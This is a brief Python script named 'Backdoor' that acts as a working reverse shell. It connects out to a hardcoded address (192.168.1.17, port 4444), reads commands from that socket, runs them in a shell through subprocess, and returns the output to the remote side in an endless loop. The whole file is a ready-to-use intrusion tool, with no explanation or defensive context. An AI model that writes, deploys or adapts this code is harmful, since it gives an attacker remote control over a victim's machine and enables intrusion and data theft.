#!/usr/bin/env python
import socket
import subprocess

class Backdoor:
    def __init__(self, ip, p):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((ip, p))

    def execute(self, cmd):
        return subprocess.check_output(cmd, shell=True)

    def start(self):
        while True:
            cmd = self.s.recv(1024)
            try:
                output = self.execute(cmd.decode("utf-8"))
            except:
                output = self.execute(str(cmd))
            self.s.send(output)
        self.s.close()


talk = Backdoor("192.168.1.17", 4444)
talk.start()